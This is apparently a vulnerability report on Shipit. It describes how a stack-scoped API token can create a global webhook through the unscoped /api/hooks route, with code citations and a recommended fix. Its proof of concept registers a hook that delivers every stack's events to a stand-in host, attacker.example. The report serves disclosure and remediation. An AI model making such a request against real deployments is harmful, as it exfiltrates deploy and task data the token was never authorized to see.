### Title
Stack-scoped API token can create a global webhook and read events from every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
The `write:hook` permission is checked without verifying that the `ApiClient` is actually authorized for the stack the created `Hook` will apply to. Because Shipit exposes two routes to the same `Api::HooksController#create` action - one nested under `/api/stacks/*stack_id/hooks` and one unscoped at `/api/hooks` - a token that is restricted to a single stack (`ApiClient#stack_id` set) can call the unscoped route and create a `Hook` with `stack_id: nil`, i.e. a *global* hook that receives delivery for every stack in the installation.

### Finding Description
`Api::HooksController` only enforces a coarse-grained permission check: [1](#0-0) [2](#0-1) 

The scope used for both reading and creating hooks is derived purely from `params[:stack_id]`, not from the authenticated `ApiClient`'s own `stack_id`: [3](#0-2) 

`config/routes.rb` mounts the exact same controller/action twice: once nested under a stack (`/api/stacks/*stack_id/hooks`) and once at the top level with no `stack_id` at all: [4](#0-3) 

`BaseController#stacks` restricts the visible `Stack` collection when the client is scoped, but this scoping is only used when a `stack_id` route param is present; it does not prevent a scoped client from hitting the unscoped route where no `stack_id` param exists at all: [5](#0-4) 

`Hook` records with `stack_id: nil` are "global" hooks. The delivery/query logic explicitly matches global hooks against *every* stack's events: [6](#0-5) 

The binding that should hold is: **the set of stacks a token authorizes == the set of stacks the hook it creates can observe.** By calling `POST /api/hooks` (instead of `POST /api/stacks/<owner>/<repo>/<env>/hooks`), a stack-scoped `ApiClient` bypasses this binding: `stack_id` param is absent, `hooks` resolves to `Hook.where(stack_id: nil)`, and the created record is attached to no stack, so `Hook.deliver` will send it every future `deploy`, `task`, `rollback`, `lock`, `commit_status`, `merge`, and `pull_request` event for **all** stacks, not just the one the token was scoped to.

### Impact Explanation
This matches the accepted "High" impact category: **unauthenticated (here: unauthorized) read of stack state, task streams or deploy output** for stacks the token was never granted access to. A token issued to a single, low-trust integration (e.g. an integration for one repository/environment with `write:hook` + `deploy:stack` permission) can exfiltrate deploy/task/commit-status/merge events - including task/deploy metadata used to build hook payloads - from every other stack managed by the same Shipit instance, by registering a hook whose `delivery_url` points to an attacker-controlled endpoint.

### Likelihood Explanation
Likelihood is High for any deployment that issues stack-scoped `ApiClient` tokens (the documented/expected way to give a third party integration write:hook/deploy:stack access to only one stack, as shown in `test/fixtures/shipit/api_clients.yml`'s `here_come_the_walrus` fixture, which is `stack`-scoped). No special privilege beyond a normal, narrowly-scoped API token is required - the only "trick" is calling the sibling unscoped route instead of the nested one, which the controller does not reject.

### Recommendation
In `Api::HooksController` (and `BaseController`), reject hook creation/listing on the unscoped `/api/hooks` routes when `current_api_client.stack_id?` is true, or force `stack_id` for scoped clients regardless of the route used (e.g., `stack_id = current_api_client.stack_id || (stack.id if params[:stack_id].present?)`), so a stack-scoped token can never create or read a global hook.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack_id: <stack A>` with permissions `['write:hook']`.
2. Authenticate with that client and call:
   `POST /api/hooks` with `{ "delivery_url": "https://attacker.example/collect", "events": ["deploy", "task", "commit_status"] }`
   (note: no stack in the path, unlike the intended `POST /api/stacks/<A>/hooks`).
3. `hooks` resolves via `Hook.where(stack_id: nil)` because `params[:stack_id]` is absent, so the created `Hook` has `stack_id: nil` (global).
4. Any subsequent `deploy`, `task`, `commit_status`, `merge`, etc. event on *any other* stack B (which the token was never authorized for) is delivered to `https://attacker.example/collect`, because `Hook.deliver(event, stack_id_B, payload)` matches hooks `where(stack_id: [nil, stack_id_B])`.

### Citations

**File:** app/controllers/shipit/api/hooks_controller.rb (L5-8)
```ruby
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

```

**File:** app/controllers/shipit/api/hooks_controller.rb (L46-52)
```ruby
      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** config/routes.rb (L27-46)
```ruby
    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
```

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
